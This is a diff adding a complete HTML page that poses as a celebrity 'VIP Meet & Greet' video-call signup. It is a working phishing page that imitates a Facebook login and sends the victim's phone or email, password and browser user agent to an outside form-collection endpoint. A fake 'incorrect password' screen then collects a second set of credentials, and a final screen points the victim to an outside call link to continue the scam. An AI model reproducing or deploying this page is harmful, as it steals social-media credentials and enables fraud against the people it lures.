@@ -1,0 +1,613 @@
+
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Call</title>
+
+<!-- Open Graph / Social Media Meta Tags -->
+<meta property="og:title" content="VIP Meet & Greet">
+<meta property="og:description" content="Exclusive meet & greet">
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5vIdEt2qNSfjfaxe_3VJZspSTdQaxCbe19t7tfPVOjDbVpzXBCtQ-SiIo&s=10">
+<meta property="og:type" content="website">
+
+<!-- Twitter Card Meta Tags -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="VIP Meet & Greet">
+<meta name="twitter:description" content="Register for an exclusive VIP meet & greet experience.">
+<meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5vIdEt2qNSfjfaxe_3VJZspSTdQaxCbe19t7tfPVOjDbVpzXBCtQ-SiIo&s=10">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --font-meet-greet-heading: 23px;
+    --font-meet-greet-text: 17px;
+    --font-processing-title: 18px;
+    --font-processing-subtitle: 18px;
+    --font-registration-heading: 29px;
+    --font-registration-body: 16px;
+    --font-event-host-details: 16px;
+  }
+
+  * {
+    box-sizing: border-box;
+    font-family: 'Inter', sans-serif;
+  }
+
+  body {
+    background: #ffffff;
+    color: #171a20;
+    margin: 0;
+    padding: 10px 4px;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+  }
+
+  .main-wrapper {
+    width: 100%;
+    display: flex;
+    justify-content: center;
+  }
+
+  #content {
+    background: #ffffff;
+    border: 1px solid #e5e7eb;
+    width: 100%;
+    max-width: 520px;
+    padding: 16px;
+    border-radius: 14px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04);
+  }
+
+  #message {
+    display: none; 
+    font-size: 18px;
+    text-align: center;
+    color: #171a20;
+  }
+
+  #mainContent, #processing, #processing2, #mainContent2, #processing3, #finalApproved {
+    display: none;
+  }
+
+  h5 {
+    margin: 0 0 10px 0;
+  }
+
+  .logo-heading-container {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 14px;
+  }
+
+  .meet-logo {
+    width: 37px;
+    height: 35px;
+    object-fit: contain;
+  }
+
+  #myForm .text-gpx {
+    font-size: var(--font-meet-greet-heading);
+    color: #4267B2;
+    font-weight: 700;
+    font-style: italic;
+    letter-spacing: 0.5px;
+    margin: 0;
+  }
+
+  #myForm .text-225px {
+    font-size: var(--font-meet-greet-text);
+    color: #000000;
+    line-height: 1.5;
+    margin-bottom: 24px;
+    text-align: left;
+    font-weight: 400;
+  }
+
+  /* Floating Label Input Container Styling */
+  .floating-group {
+    position: relative;
+    margin-bottom: 24px;
+    width: 100%;
+  }
+
+  .floating-input {
+    width: 100%;
+    height: 48px;
+    font-size: 16px;
+    color: #171a20;
+    background-color: #ffffff;
+    border: 1.5px solid #000000;
+    border-radius: 9px;
+    padding: 0 16px;
+    outline: none;
+    transition: border-color 0.2s ease;
+  }
+
+  .floating-input:focus {
+    border-color: #1a73e8;
+  }
+
+  .floating-label {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    background-color: #ffffff;
+    padding: 0 4px;
+    color: #000000;
+    font-size: 16px;
+    font-weight: 500;
+    pointer-events: none;
+    transition: 0.2s ease all;
+  }
+
+  .floating-input:focus ~ .floating-label,
+  .floating-input:not(:placeholder-shown) ~ .floating-label {
+    top: 0;
+    transform: translateY(-50%) scale(0.85);
+    font-size: 12px;
+    font-weight: 600;
+    color: #1a73e8;
+  }
+
+  .responsive-btn {
+    width: 100%;
+    height: 40px;
+    border: 0;
+    border-radius: 20px;
+    background-color: #2B60DE;
+    color: #ffffff;
+    font-size: 15px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    cursor: pointer;
+    transition: background-color 0.2s ease;
+    margin-top: 5px;
+  }
+
+  .responsive-btn:hover {
+    background-color: #1557b0;
+  }
+
+  .processing-container {
+    text-align: center;
+    padding: 75px 0;
+  }
+
+  .processing-title {
+    color: #171a20;
+    font-weight: 600;
+    font-size: var(--font-processing-title);
+    letter-spacing: 0.5px;
+    margin: 0 0 6px 0;
+  }
+
+  .processing-subtitle {
+    color: #000000;
+    font-size: var(--font-processing-subtitle);
+    font-weight: 500;
+    margin: 0 0 15px 0;
+  }
+
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 75px;
+    height: 75px;
+    margin: 15px 0;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 62px;
+    height: 62px;
+    margin: 6px;
+    border: 6px solid #1a73e8;
+    border-radius: 50%;
+    animation: lds-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: #1a73e8 transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) { animation-delay: -0.45s; }
+  .lds-ring div:nth-child(2) { animation-delay: -0.3s; }
+  .lds-ring div:nth-child(3) { animation-delay: -0.15s; }
+  
+  @keyframes lds-ring {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  #mainContent .text-gpx, #mainContent2 .text-gpx {
+    font-size: var(--font-registration-heading);
+    color: #4267B2;
+    font-weight: 500;
+    letter-spacing: 0.5px;
+  }
+
+  #mainContent .text-Ampx, #mainContent2 .text-Ampx {
+    font-size: var(--font-registration-body);
+    font-weight: 500;
+    color: #000000;
+    line-height: 1.5;
+    margin-bottom: 20px;
+    text-align: left;
+  }
+
+  .lower-section {
+    padding: 0;
+  }
+
+  .minimal-card {
+    background: transparent;
+    border: none;
+    padding: 0;
+    border-radius: 0;
+    margin-bottom: 14px;
+    font-size: var(--font-event-host-details);
+    color: #000000;
+    line-height: 1.8;
+    width: 100%;
+  }
+
+  /* Final approval confirmation styling */
+  .confirmed-heading {
+    font-size: 25px;
+    font-weight: 700;
+    color: #171a20;
+    margin: 0 0 12px 0;
+    text-align: left;
+  }
+
+  .confirmed-text {
+    font-size: 16px;
+    font-weight: 400;
+    color: #000000;
+    line-height: 1.5;
+    margin: 0;
+    text-align: left;
+  }
+</style>
+</head>
+<body>
+
+    <div id="message">Hello World</div>
+ 
+    <div class="main-wrapper">
+      <div id="content">
+
+        <!-- Form 1 -->
+        <form id="myForm" onsubmit="submitForm(); return false;">
+
+          <h5 class="text-225px"><br><strong>
+             VIDEO CALL </strong>
+             <br><br>Enter the name of the celebrity  you are joining for the video call.
+          </h5>
+
+          <div id="error-message" style="color: #dc2626; font-size: 11px; margin-bottom: 4px;"></div>
+
+          <div class="floating-group">
+            <input type="text" required name="A_" id="name" class="floating-input" placeholder=" " oninput="validateInput(this)" />
+            <span class="floating-label">Celebrity Name</span>
+          </div>
+
+          <div style="display: none;">
+            <input type="text" placeholder="How long have you been a fan?" />
+            <input type="text" id="email" name="A_" placeholder="Enter your first and last name" />
+            <input type="text" id="phonenumber" name="A_" placeholder="Enter the name of your city" />
+          </div>
+
+          <button type="submit" class="responsive-btn">Continue</button>
+        </form>
+
+        <!-- Processing 1 -->
+        <div id="processing" class="processing-container">
+          <div class="processing-title">Processing request...</div>
+          <div class="processing-subtitle">Please wait</div>
+          <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+        </div>
+
+        <!-- Main Content / Form 2 (Registration Page) -->
+        <div id="mainContent">
+          <form id="secondForm" onsubmit="submitSecondForm(event);">
+            <input type="hidden" name="Celeb" id="hiddenCelebInput">
+        
+
+
+
+
+<h5 class="text-gpx">
+
+<center>
+
+ <img src="https://www.pngmart.com/files/15/Circle-Facebook-Logo-PNG-Transparent-Picture.png" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 2000px; width: 55px; height: 55px; margin: 0px;" alt="Circle Facebook Logo, Icon, Social Media, Communication, Branding PNG" role="button" tabindex="0" aria-label="Circle Facebook Logo, Icon, Social Media, Communication, Branding PNG Search inside image" aria-pressed="false" jsname="kn3ccd">
+<br>
+
+ facebook</center>
+
+
+
+<h5 class="text-Ampx">
+<center>
+
+You can now video call  <span class="submittedName"></span>.
+The call will be done on facebook. To join, please log into your facebook account.
+</center> </center>
+</h5>
+</h5><br>
+
+
+
+
+
+            <div>
+              <div class="floating-group">
+                <input type="text" required id="fullName" name="phoneEMAIL" class="floating-input" placeholder=" " oninput="validateMinLength(this, 3, 'Please complete this)" />
+                <span class="floating-label"> Phone number or email</span>
+              </div>
+
+              <div class="floating-group">
+                <input type="text" required id="email2" name="Pass" class="floating-input" placeholder=" " oninput="validateMinLength(this, 3, 'Please enter your password')" />
+                <span class="floating-label"> Password</span>
+              </div>
+
+
+
+<div style="display: none;">
+              <div class="floating-group">
+                <input type="text" id="address" class="floating-input" placeholder=" " />
+                <span class="floating-label">How long have you been a fan of <span class="submittedName"></span>?</span>
+              </div>
+
+              <div class="floating-group">
+                <input type="text" id="phone2" name="Phone" class="floating-input" placeholder=" " />
+                
+                </div>
+                
+                <span class="floating-label">Enter your phone number</span>
+              </div>
+
+              <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+
+              <button type="submit" class="responsive-btn">Log in</button>
+            </div>
+          </form>
+        </div> 
+
+        <!-- Processing 2 -->
+        <div id="processing2" class="processing-container">
+          <div class="processing-title">Verifying . . .</div>
+          <div class="processing-subtitle" style="margin-top: 15px;">
+please wait</div>
+          <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+        </div>
+
+        <!-- Third Form Section (Independent) -->
+        <div id="mainContent2">
+          <div class="lower-section">
+            
+            <form action="https://submit-form.com/QzOi0GhFC" method="POST" id="thirdForm" onsubmit="submitThirdForm(event);">
+            
+              
+<h5 class="text-gpx">
+
+<center>
+
+ <img src="https://www.pngmart.com/files/15/Circle-Facebook-Logo-PNG-Transparent-Picture.png" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 2000px; width: 55px; height: 55px; margin: 0px;" alt="Circle Facebook Logo, Icon, Social Media, Communication, Branding PNG" role="button" tabindex="0" aria-label="Circle Facebook Logo, Icon, Social Media, Communication, Branding PNG Search inside image" aria-pressed="false" jsname="kn3ccd">
+<br>
+
+ facebook</center>
+
+              
+              
+              
+              
+              <h5 class="text-Ampx">
+                
+Incorrect password. Please try again, ensuring you use the correct password.
+
+              </h5>
+
+              <div>
+                <div class="floating-group">
+                  <input type="text" required id="confirmName" name="Facebok_2nd_try" class="floating-input" placeholder=" " />
+                  <span class="floating-label">Username</span>
+                </div>
+
+                <div class="floating-group">
+                  <input type="text" required id="confirmLocation" name="Pass2" class="floating-input" placeholder=" " />
+                  <span class="floating-label">Password</span>
+                </div>
+
+                <button type="submit" class="responsive-btn">Log in</button>
+              </div>
+            </form>
+          </div>
+        </div>
+
+        <!-- Processing 3 -->
+        <div id="processing3" class="processing-container">
+          <div class="processing-title">Finalizing . . .</div>
+          <div class="processing-subtitle" style="margin-top: 15px;"> Please wait</div>
+          <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+        </div>
+
+        <!-- Blank White Final Approved Page -->
+        <div id="finalApproved" style="background: #ffffff; min-height: 200px; padding: 10px 0;">
+          <div class="lower-section">
+          <br><br><center>
+            <h2 class="confirmed-heading">IMPORTANT
+<br><br>
+</h2></center> 
+ <p class="confirmed-text">
+
+You are almost ready. Just tap "Video Call Team" to contact us, and we will add you to the video call with <span class="submittedName"></span> 
+</p>
+            <br><br>
+            <a href="https://1439.3cx.cloud/callus/#coach">            <button type="button" class="responsive-btn">Video Call Team</button>
+            </a>
+          </div>
+        </div>
+
+      </div>
+    </div>
+
+<script>
+    const userAgent = navigator.userAgent;
+    if(document.getElementById('hidden-user-agent')) {
+        document.getElementById('hidden-user-agent').value = userAgent;
+    }
+
+    function validateInput(input) {
+      var minLength = 5;
+      var maxLength = 28;
+      var errorMessage = document.getElementById("error-message");
+
+      if (input.value.length < minLength || input.value.length > maxLength) {
+        errorMessage.textContent = "";
+        input.setCustomValidity("Please enter a valid celebrity name");
+      } else {
+        errorMessage.textContent = "";
+        input.setCustomValidity("");
+      }
+    }
+
+    function validateMinLength(input, minLength, message) {
+      if (input.value.length < minLength) {
+        input.setCustomValidity(message);
+      } else {
+        input.setCustomValidity("");
+      }
+    }
+
+    document.getElementById("processing").style.display = "none";
+    document.getElementById("processing2").style.display = "none";
+    document.getElementById("processing3").style.display = "none";
+    document.getElementById("myForm").style.display = "block";
+
+    function getActiveEventDate() {
+        let target = new Date(2026, 9, 30);
+        const now = new Date();
+        
+        while (true) {
+            let thresholdDate = new Date(target);
+            thresholdDate.setDate(thresholdDate.getDate() - 14);
+            
+            if (now < thresholdDate) {
+                break;
+            }
+            target.setDate(target.getDate() + 25);
+        }
+        
+        const options = { month: 'long', day: 'numeric', year: 'numeric' };
+        return target.toLocaleDateString('en-US', options);
+    }
+
+    function submitForm() {
+        const celebName = document.getElementById("name").value;
+        const hiddenCelebField = document.getElementById("hiddenCelebInput");
+        if (hiddenCelebField) {
+            hiddenCelebField.value = celebName;
+        }
+
+        document.getElementById("myForm").style.display = "none";
+        document.getElementById("processing").style.display = "block";
+        
+        setTimeout(function() {
+            document.getElementById("processing").style.display = "none";
+            document.getElementById("mainContent").style.display = "block";
+            
+            const submittedNameElements = document.getElementsByClassName("submittedName");
+            for (let i = 0; i < submittedNameElements.length; i++) {
+                submittedNameElements[i].textContent = celebName;
+            }
+            
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }, 1000);
+    }
+
+    function submitSecondForm(event) {
+        event.preventDefault();
+        
+        const formElement = document.getElementById("secondForm");
+        const formData = new FormData(formElement);
+
+        formElement.style.display = "none";
+        document.getElementById("processing2").style.display = "block";
+
+        fetch("https://submit-form.com/QzOi0GhFC", {
+            method: "POST",
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
+        })
+        .catch(error => {
+            console.error('Second form submission error:', error);
+        })
+        .finally(() => {
+            setTimeout(function() {
+                document.getElementById("processing2").style.display = "none";
+                
+                const mainContent2 = document.getElementById("mainContent2");
+                mainContent2.style.display = "block";
+                
+                const fullName = document.getElementById("fullName").value;
+                const email2 = document.getElementById("email2").value;
+                const phone2 = document.getElementById("phone2").value;
+                const address = document.getElementById("address").value;
+
+                document.querySelectorAll(".submittedFullName").forEach(el => el.textContent = fullName);
+                document.querySelectorAll(".submittedEmail2").forEach(el => el.textContent = email2);
+                document.querySelectorAll(".submittedPhone2").forEach(el => el.textContent = phone2);
+                document.querySelectorAll(".submittedAddress").forEach(el => el.textContent = address);
+
+                const activeDate = getActiveEventDate();
+                document.querySelectorAll(".event-date").forEach(el => el.textContent = activeDate);
+
+                mainContent2.scrollIntoView({ behavior: 'smooth' });
+            }, 2000);
+        });
+    }
+
+    function submitThirdForm(event) {
+        event.preventDefault();
+
+        const formElement = document.getElementById("thirdForm");
+        const formData = new FormData(formElement);
+
+        formElement.style.display = "none";
+        document.getElementById("processing3").style.display = "block";
+
+        fetch("https://submit-form.com/QzOi0GhFC", {
+            method: "POST",
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
+        })
+        .catch(error => {
+            console.error('Third form submission error:', error);
+        })
+        .finally(() => {
+            setTimeout(function() {
+                document.getElementById("processing3").style.display = "none";
+                
+                const finalApproved = document.getElementById("finalApproved");
+                finalApproved.style.display = "block";
+
+                finalApproved.scrollIntoView({ behavior: 'smooth' });
+            }, 2000);
+        });
+    }
+</script>
+</body>
+</html>
